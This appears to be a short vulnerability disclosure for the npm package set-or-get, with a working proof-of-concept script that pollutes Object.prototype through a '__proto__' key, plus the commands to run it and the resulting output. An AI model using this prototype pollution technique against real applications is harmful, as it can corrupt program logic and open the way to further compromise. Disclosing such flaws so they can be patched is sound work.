# Description

`set-or-get` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var SetOrGet = require("set-or-get");
var obj = {}
console.log("Before : " + {}.polluted);
SetOrGet(obj, "__proto__", {}).polluted ='Yes! Its Polluted';
console.log("After : " + {}.polluted);
```


2. Execute the following commands in terminal:

```
npm i set-or-get # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
